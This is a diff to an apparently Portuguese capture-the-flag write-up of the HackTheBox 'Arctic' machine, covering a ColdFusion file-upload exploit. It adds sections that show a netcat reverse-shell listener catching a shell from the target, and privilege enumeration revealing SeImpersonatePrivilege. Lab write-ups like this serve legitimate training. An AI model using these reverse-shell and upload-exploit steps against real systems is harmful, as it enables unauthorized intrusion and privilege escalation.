@@ -97,6 +97,8 @@ Tentei login com  a senha encontrada, mas sem sucesso
 
 Vamos tentar entao a segunda exploracao que encontramos **Adobe ColdFusion 2018 - Arbitrary File Upload**
 
+## Reverse Shell
+
 Depois de algumas pesquisas encontrei um exploit funcional https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload
 
 Entao, gerei meu payload em jsp com o seguinte comando abaixo https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/
@@ -126,6 +128,35 @@ E acesse via browser a URL http://10.10.10.11:8500/userfiles/file/exploit.jsp
 
 ![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/7.jpg)
 
+## Privilege Escalation
 
+Comecamos entao a fase de escalada, vamos la...
 
+```
+root@kali:~/HTB-Windows/arctic# rlwrap nc -nlvp 53
+listening on [any] 53 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.10.10.11] 49650
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\ColdFusion8\runtime\bin>whoami
+whoami
+arctic\tolis
+
+C:\ColdFusion8\runtime\bin>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+C:\ColdFusion8\runtime\bin>
+
+```
 
